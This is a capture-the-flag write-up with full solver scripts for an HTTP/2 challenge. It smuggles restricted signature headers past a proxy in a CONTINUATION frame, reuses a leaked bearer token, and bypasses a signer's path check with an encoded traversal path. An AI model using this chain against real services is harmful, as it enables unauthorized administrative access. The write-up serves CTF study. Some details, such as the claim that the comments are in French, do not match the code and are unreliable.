### Summary

The front proxy `cassandra-edge/2.3.1` checks restricted headers (`content-length`, `transfer-encoding`, `x-admin-sig`, `x-admin-ts`, `x-signed-path`) only in the first HEADERS frame, so the same headers sent in a CONTINUATION frame get through. A bearer token for the internal monitor leaks through the public notes board (`/api/notes`), and it can be used to get `/internal/sign` to sign the path `/api/..%2fadmin/flag`. The signer only refuses paths that literally start with `/admin`, but the admin route unquotes and normalises that path to `/admin/flag`. Sending `GET /admin/flag` with the signature injected in a CONTINUATION frame returns the flag.

### Steps

1. Reconnaissance. The service speaks HTTP/2 over TLS with a self-signed certificate for `cassandra.local`. The backend is FastAPI/Starlette. The public catalogue lists `/api/health`, `/api/status`, `/api/changelog` and `/api/notes`. The flag is behind `/admin/flag`, which returns 401 and asks for `X-Admin-Sig`, `X-Admin-Ts` and `X-Signed-Path`. On first contact the backend may be cold, and proxied requests can hang for a few seconds before they answer. After it wakes up, every route responds in milliseconds.

2. Read the changelog, since it describes the bug. `GET /api/changelog` contains three relevant entries:
   - The restricted-header check runs only while decoding the first HEADERS frame, and "CONTINUATION frames retain the previous fast path". Headers in a CONTINUATION frame bypass the filter.
   - The internal signer refuses paths that start with the literal string `/admin`.
   - The admin route normalises the path with `urllib.parse.unquote` and `os.path.normpath`, but legacy signatures are verified against the raw `X-Signed-Path` value.

   ```sh
   curl -sk --http2 https://0.cloud.chals.io:30152/api/changelog
   ```

   Path traversal inside the request line does not help. Requests whose path contains `..` or `.` segments return 404, because Starlette routes the raw path without `normpath`. The bypass has to go in `X-Signed-Path`, while the request itself targets the real route `/admin/flag`.

3. Leak the bearer token. The internal monitor calls `POST /internal/sign` every 3 seconds, and its request is captured in the notes board through a request smuggling desync. `GET /api/notes/201` returns the captured notes, some of which are 1500 bytes long and contain raw HTTP requests. Polling that endpoint until a `Bearer` string appears gives the monitor's request. It contains `authorization: Bearer dev_bot_bearer_do_not_ship` and an example body with the path `/api/..%2fadmin/flag`.

   ```sh
   python3 - <<'PY'
   import sys, re
   sys.path.insert(0, 'scripts')
   from h2c import h2_request
   for _ in range(120):
       b = h2_request('/api/notes/201', timeout=5)[2].decode('latin1')
       m = re.search(r'[Bb]earer ([\w\-]+)', b)
       if m:
           print(b)
           break
   PY
   ```

   The token is static. The name `do_not_ship` suggests it was never meant to be public.

4. Get the signature. Send the bypass path to the signer with the leaked bearer token. The string check passes because the path does not start with `/admin`, and the admin route later normalises it to `/admin/flag`.

   ```text
   POST /internal/sign
   authorization: Bearer dev_bot_bearer_do_not_ship
   body: {"method":"GET","path":"/api/..%2fadmin/flag","ts":<now>}
   -> {"sig":"<hmac>","signed_message":"GET /api/..%2fadmin/flag <ts>"}
   ```

   The HMAC covers the signed message `GET /api/..%2fadmin/flag <ts>`, so the path and timestamp must match exactly.

5. Send the final request. Open `GET /admin/flag` and put `X-Admin-Sig`, `X-Admin-Ts` and `X-Signed-Path: /api/..%2fadmin/flag` in a CONTINUATION frame. If they appear in the HEADERS frame, the proxy answers `400 restricted header`. The backend routes the request to `/admin/flag`, verifies the signature against the raw `X-Signed-Path` value, and accepts a timestamp within 30 seconds of the server clock. The helper `h2_split` in `scripts/h2raw.py` builds the frames.

   ```sh
   python3 scripts/solve.py
   # {"flag":"isfcr{REDACTED}"}
   ```

   Probe results with the CONTINUATION bypass: a fresh timestamp with a bogus signature returns `401 {"detail":"bad signature"}`, and an old timestamp returns `401 ts outside ±30s window`. Both show that the injected headers reach the backend, so a valid HMAC and a fresh timestamp are the only remaining requirements.

### Scripts

#### team/404Dude/scripts/solve.py

End-to-end exploit. It signs `/api/..%2fadmin/flag` with the leaked bearer, injects the signature headers in a CONTINUATION frame, and prints the response body that contains the flag. It re-signs every few attempts because the signature is valid for about 30 seconds, and it retries when a response from the shared backend pool is crossed with another request. It imports `h2c.py` and `h2raw.py` from the same directory. Run it with a Python that has `h2` and `hpack` installed: `python3 team/404Dude/scripts/solve.py`.

```python
#!/usr/bin/env python3
"""Cassandra: end-to-end solve.

Exploit chain:
  1. The internal monitor calls POST /internal/sign every 3s with
     `Authorization: Bearer dev_bot_bearer_do_not_ship`. Its request leaks into
     the public bulletin board /api/notes through a smuggling desync; it is
     replayed by polling GET /api/notes/201 (which cycles through captured
     notes).
     -> bearer = dev_bot_bearer_do_not_ship (static, named "do_not_ship")
  2. POST /internal/sign (with that bearer) to sign the path
     `/api/..%2fadmin/flag`: it does not literally start with `/admin`
     (the signer only refuses that), but unquote+normpath maps it to
     /admin/flag.
     -> returns sig = HMAC("GET /api/..%2fadmin/flag <ts>")
  3. GET /admin/flag, injecting X-Admin-Sig / X-Admin-Ts / X-Signed-Path in a
     CONTINUATION frame (cassandra-edge's "restricted header" filter only
     inspects the first HEADERS frame). X-Signed-Path is the raw signed path;
     the backend checks the signature against the raw value and routes to
     /admin/flag.

Usage: work/scratch/venv/bin/python work/scripts/solve.py
Dependencies: h2, hpack (see work/scratch/venv). Scripts: h2c.py, h2raw.py.
"""
import sys, os, time, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from h2c import h2_request
from h2raw import h2_split

BEARER = "dev_bot_bearer_do_not_ship"
SIGNPATH = "/api/..%2fadmin/flag"   # literal-check bypass ; unquote+normpath -> /admin/flag


def recover_bearer(tries=120):
    """Optional: replays the bearer from the captured notes (if unknown)."""
    import re
    for _ in range(tries):
        try:
            s, h, b = h2_request("/api/notes/201", timeout=5)
            m = re.search(r"[Bb]earer ([A-Za-z0-9_\-]+)", b.decode("latin1"))
            if m:
                return m.group(1)
        except Exception:
            pass
    return None


def sign(path):
    for _ in range(15):
        try:
            body = json.dumps({"method": "GET", "path": path, "ts": int(time.time())})
            s, h, b = h2_request("/internal/sign", method="POST", body=body,
                                 extra_headers=[("authorization", "Bearer " + BEARER),
                                                ("content-type", "application/json")],
                                 timeout=8)
            d = json.loads(b.decode("latin1"))
            if isinstance(d, dict) and "sig" in d:
                return d["sig"], d["signed_message"].split()[-1]
        except Exception:
            pass
        time.sleep(0.3)
    raise RuntimeError("signing failed (invalid bearer?)")


def get_flag(attempts=20):
    # Backend connections are pooled: the response to /admin/flag can be
    # crossed with another request from the pool. Re-sign and retry until
    # the body with the flag comes back.
    sig = ts = None
    for i in range(attempts):
        if sig is None or i % 4 == 0:      # re-sign periodically (+/-30s window)
            sig, ts = sign(SIGNPATH)
        try:
            st, hh, bb = h2_split("/admin/flag", method="GET",
                                  cont_headers=[("x-admin-sig", sig),
                                                ("x-admin-ts", ts),
                                                ("x-signed-path", SIGNPATH)],
                                  timeout=8)
            body = bb.decode("latin1")
            if st == "200" and "\"flag\"" in body:
                return body
        except Exception:
            pass
        time.sleep(0.2)
    return None


if __name__ == "__main__":
    out = get_flag()
    print(out if out else "failed, retry (+/-30s window / pool crossover)")
```

#### team/404Dude/scripts/h2c.py

Low-level HTTP/2 client built on the `h2` library. It sends one request on a fresh TLS connection and returns `(status, headers, body)`. The solver uses it for the leak step and for the `/internal/sign` call. It can also be run from the command line as `python3 h2c.py <path> [method] [-H name:value]`.

```python
#!/usr/bin/env python3
"""Low-level HTTP/2 client for the Cassandra proxy challenge.

Full control over pseudo-headers, header order/casing-as-sent, and raw frames
so we can probe HTTP/2 request-smuggling / normalisation behaviour.

Usage as a library:
    from h2c import h2_request
    status, headers, body = h2_request("/status", headers=[...], method="GET")

CLI: python h2c.py <path> [method] [-H name:value ...]
"""
import socket, ssl, sys, time
import h2.connection
import h2.config
import h2.events

HOST = "0.cloud.chals.io"
PORT = 30152


def connect(host=HOST, port=PORT, timeout=15):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((host, port), timeout=timeout)
    tls = ctx.wrap_socket(raw, server_hostname=host)
    return tls


def h2_request(path, method="GET", authority=f"{HOST}:{PORT}", scheme="https",
               extra_headers=None, body=None, timeout=15, raw_headers=None,
               end_stream=True):
    """Send one request on a fresh connection. Returns (status, headers, body).

    raw_headers, if given, fully replaces the header list (list of (name,value)
    byte/str tuples), use for exact control incl. pseudo-header games.
    """
    tls = connect(timeout=timeout)
    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8",
                                    validate_outbound_headers=False,
                                    normalize_outbound_headers=False)
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    tls.sendall(conn.data_to_send())

    if raw_headers is not None:
        hdrs = raw_headers
    else:
        hdrs = [(":method", method), (":path", path),
                (":scheme", scheme), (":authority", authority)]
        if extra_headers:
            hdrs += list(extra_headers)
    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, hdrs, end_stream=(body is None and end_stream))
    tls.sendall(conn.data_to_send())
    if body is not None:
        conn.send_data(sid, body if isinstance(body, bytes) else body.encode(),
                       end_stream=end_stream)
        tls.sendall(conn.data_to_send())

    status = None
    resp_headers = []
    data = bytearray()
    deadline = time.time() + timeout
    tls.settimeout(timeout)
    done = False
    while not done and time.time() < deadline:
        try:
            chunk = tls.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        for ev in conn.receive_data(chunk):
            if isinstance(ev, h2.events.ResponseReceived):
                for k, v in ev.headers:
                    if k == ":status":
                        status = v
                    resp_headers.append((k, v))
            elif isinstance(ev, h2.events.DataReceived):
                data += ev.data
                conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
            elif isinstance(ev, (h2.events.StreamEnded,)):
                done = True
            elif isinstance(ev, (h2.events.StreamReset, h2.events.ConnectionTerminated)):
                resp_headers.append(("__event__", repr(ev)))
                done = True
        out = conn.data_to_send()
        if out:
            tls.sendall(out)
    try:
        tls.close()
    except OSError:
        pass
    return status, resp_headers, bytes(data)


if __name__ == "__main__":
    path = sys.argv[1] if len(sys.argv) > 1 else "/"
    method = "GET"
    extra = []
    args = sys.argv[2:]
    i = 0
    while i < len(args):
        if args[i] == "-H":
            name, _, value = args[i + 1].partition(":")
            extra.append((name.strip(), value.strip()))
            i += 2
        else:
            method = args[i]
            i += 1
    s, h, b = h2_request(path, method=method, extra_headers=extra)
    print("STATUS:", s)
    for k, v in h:
        print("  %s: %s" % (k, v))
    print("BODY (%d bytes):" % len(b))
    print(b.decode("latin1")[:4000])
```

#### team/404Dude/scripts/h2raw.py

Raw HTTP/2 client that writes the HEADERS and CONTINUATION frames by hand. `h2_split(path, cont_headers=[...])` places the given header fields in the CONTINUATION frame, which is how the restricted-header filter is bypassed. The file needs `hpack` and must sit in the same directory as `solve.py`.

```python
#!/usr/bin/env python3
"""Raw HTTP/2 client with explicit HEADERS + CONTINUATION frame control.

cassandra-edge only runs its restricted-header check over the first HEADERS
frame; header fields carried in a CONTINUATION frame bypass the filter
(per /api/changelog 2026-08-19). This client lets us place chosen header
fields in the CONTINUATION frame.

h2_split(path, first_headers, cont_headers, ...) -> (status, headers, body)
  first_headers : list of (name,value) encoded in the HEADERS frame (seen by filter)
  cont_headers  : list of (name,value) encoded in the CONTINUATION frame (bypasses)
"""
import socket, ssl, struct, time
from hpack import Encoder

HOST = "0.cloud.chals.io"
PORT = 30152
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def _frame(ftype, flags, sid, payload):
    return struct.pack(">I", len(payload))[1:] + bytes([ftype, flags]) + struct.pack(">I", sid) + payload


def connect(timeout=15):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((HOST, PORT), timeout=timeout)
    return ctx.wrap_socket(raw, server_hostname=HOST)


def handshake(sock):
    sock.sendall(PREFACE)
    sock.sendall(_frame(0x4, 0x0, 0, b""))          # empty SETTINGS
    sock.sendall(_frame(0x4, 0x1, 0, b""))          # SETTINGS ACK


def _read_frames(sock, timeout):
    """Yield (ftype, flags, sid, payload) until timeout/close."""
    sock.settimeout(timeout)
    buf = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        while len(buf) >= 9:
            ln = int.from_bytes(buf[:3], "big")
            if len(buf) < 9 + ln:
                break
            ftype, flags = buf[3], buf[4]
            sid = int.from_bytes(buf[5:9], "big") & 0x7fffffff
            payload = buf[9:9 + ln]
            buf = buf[9 + ln:]
            yield ftype, flags, sid, payload


def h2_split(path, method="GET", authority=f"{HOST}:{PORT}", scheme="https",
             first_extra=None, cont_headers=None, body=None, timeout=12, sid=1):
    sock = connect(timeout)
    handshake(sock)
    enc = Encoder()
    pseudo = [(":method", method), (":path", path), (":scheme", scheme), (":authority", authority)]
    first = pseudo + list(first_extra or [])
    block_first = enc.encode(first)
    block_cont = enc.encode(list(cont_headers or [])) if cont_headers else b""

    end_stream = (body is None)
    if block_cont:
        # HEADERS without END_HEADERS, then CONTINUATION with END_HEADERS
        flags_h = 0x0  # no END_STREAM yet (set on last frame), no END_HEADERS
        sock.sendall(_frame(0x1, flags_h, sid, block_first))
        flags_c = 0x4  # END_HEADERS
        if end_stream:
            flags_c |= 0x1  # END_STREAM on the CONTINUATION? No: END_STREAM is a
        # NOTE: END_STREAM is a HEADERS/DATA flag, NOT valid on CONTINUATION.
        # So when there's no body we must end the stream via an empty DATA frame.
        sock.sendall(_frame(0x9, 0x4, sid, block_cont))  # CONTINUATION END_HEADERS
        if end_stream:
            sock.sendall(_frame(0x0, 0x1, sid, b""))     # empty DATA END_STREAM
        else:
            sock.sendall(_frame(0x0, 0x1, sid, body if isinstance(body, bytes) else body.encode()))
    else:
        flags_h = 0x4 | (0x1 if end_stream else 0x0)     # END_HEADERS (+END_STREAM)
        sock.sendall(_frame(0x1, flags_h, sid, block_first))
        if not end_stream:
            sock.sendall(_frame(0x0, 0x1, sid, body if isinstance(body, bytes) else body.encode()))

    status = None
    headers = []
    data = bytearray()
    from hpack import Decoder
    dec = Decoder()
    for ftype, flags, fsid, payload in _read_frames(sock, timeout):
        if ftype == 0x1:   # HEADERS (response)
            try:
                hdrs = dec.decode(payload)
            except Exception as e:
                headers.append(("__decode_err__", str(e)))
                hdrs = []
            for k, v in hdrs:
                if k == ":status":
                    status = v
                headers.append((k, v))
        elif ftype == 0x0:  # DATA
            data += payload
            if flags & 0x1:
                break
        elif ftype == 0x3:  # RST_STREAM
            headers.append(("__rst__", payload.hex()))
            break
        elif ftype == 0x7:  # GOAWAY
            headers.append(("__goaway__", payload.hex()))
    try:
        sock.close()
    except OSError:
        pass
    return status, headers, bytes(data)


if __name__ == "__main__":
    # smoke test: inject restricted headers via CONTINUATION
    s, h, b = h2_split("/admin/flag",
                       cont_headers=[("x-admin-sig", "AAA"), ("x-admin-ts", "1"),
                                     ("x-signed-path", "/admin/flag")])
    print("STATUS", s)
    for k, v in h:
        print("  ", k, ":", v)
    print("BODY:", b[:300].decode("latin1"))
```

### Notes

- The bearer `dev_bot_bearer_do_not_ship` is static. If the monitor rotates it, read the new value again from `/api/notes` (step 3).
- The backend connections are shared. Responses from `/internal/sign` and `/api/notes` sometimes cross, so `solve.py` retries until it gets a `sig` field, and it re-signs every few attempts because the signature window is about 30 seconds.
- Dead end: `..` and `.` segments in the request path return 404, so the bypass has to live in `X-Signed-Path`.
- The commands in the steps assume the working directory is `work/team/404Dude`, where `scripts/` lives.
- The helper scripts were run from a virtual environment with `h2` and `hpack` installed. That environment is not part of the vault. Install both packages (`pip install h2 hpack`) before running the solver.
- The first request after a cold start can hang for several seconds. Retry rather than assume the service is down.
- The solver is written for the host `0.cloud.chals.io:30152`. Adjust `HOST` and `PORT` in `h2c.py` and `h2raw.py` if the instance is reissued on another address.
- The comments and the error string in the copied scripts are in French, as they were in the original. They are kept verbatim so the source matches the vault file.
